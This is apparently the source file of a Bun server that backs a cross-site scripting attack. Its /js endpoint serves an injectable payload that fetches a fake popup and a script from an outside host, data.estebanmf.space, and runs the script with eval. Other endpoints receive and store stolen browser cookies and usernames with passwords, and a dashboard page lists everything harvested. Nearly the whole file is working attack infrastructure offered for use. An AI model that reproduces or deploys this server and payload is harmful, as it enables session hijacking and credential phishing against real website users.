import { serve } from "bun";
import { initDB, addCookie, listCookies, addCredential, listCredentials } from "./db";
import { renderPage } from "./html";
import fs from "fs";

await initDB();

serve({
  port: 3000,
  async fetch(req) {
    const url = new URL(req.url);
    const origin = req.headers.get("Origin") || "*"; // Get the requesting origin

    // Serve xss.html for a specific endpoint (e.g., /xss)
    if (url.pathname === "/xss" && req.method === "GET") {
      const xssHtml = fs.readFileSync("xss.html", "utf-8");
      return new Response(xssHtml, {
        headers: {
          "Content-Type": "text/html",
          "Access-Control-Allow-Origin": origin, // Allow the requesting origin
        },
      });
    }

    if (url.pathname === "/xss-script" && req.method === "GET") {
      const jsCode = fs.readFileSync("xss-script.js", "utf-8");
      return new Response(jsCode, {
        headers: {
          "Content-Type": "application/javascript",
          "Access-Control-Allow-Origin": origin,
        },
      });
    }


    if (url.pathname === "/js" && req.method === "GET") {
      const jsCode = `
console.log('Evaluating JS string');
fetch('https://data.estebanmf.space/xss')
.then(t => t.text())
.then(d => {
console.log('Fetched HTML:', d);
// Create a temporary div to parse the popup
const tempDiv = document.createElement('div');
tempDiv.innerHTML = d;
const popup = tempDiv.querySelector('#xss-popup');
if (!popup) {
console.error('Popup div not found in fetched HTML');
return;
}
// Append popup to existing body
document.body.appendChild(popup);
console.log('Popup appended to body');
console.log('Checking if submit-btn exists:', !!document.getElementById('submit-btn'));
// Fetch and eval xss-script.js
fetch('https://data.estebanmf.space/xss-script.js')
.then(t => t.text())
.then(script => {
console.log('xss-script.js fetched, content:', script);
console.log('xss-script.js evaluating');
try {
eval(script);
console.log('xss-script.js evaluated');
} catch (e) {
console.error('Eval failed:', e);
}
})
.catch(e => console.error('Script fetch error:', e));
})
.catch(e => console.error('HTML fetch error:', e));
`;
      return new Response(jsCode, {
        headers: {
          "Content-Type": "application/javascript",
          "Access-Control-Allow-Origin": origin,
        },
      });
    }

    // POST /cookies
    if (url.pathname === "/cookies" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { cookies?: string } | null;
      if (body?.cookies) {
        await addCookie(body.cookies);
        return new Response("Cookies received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing cookies", { status: 400 });
    }

    // POST /credentials
    if (url.pathname === "/credentials" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { username?: string; password?: string } | null;
      if (body?.username && body?.password) {
        await addCredential(body.username, body.password);
        return new Response("Credentials received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing username or password", { status: 400 });
    }

    // GET /
    if (url.pathname === "/") {
      const cookies = await listCookies();
      const creds = await listCredentials();
      return new Response(renderPage(cookies, creds), {
        headers: { "Content-Type": "text/html" },
      });
    }

    return new Response("Not found", { status: 404 });
  },
});

console.log("🚀 Server running at http://localhost:3000/");
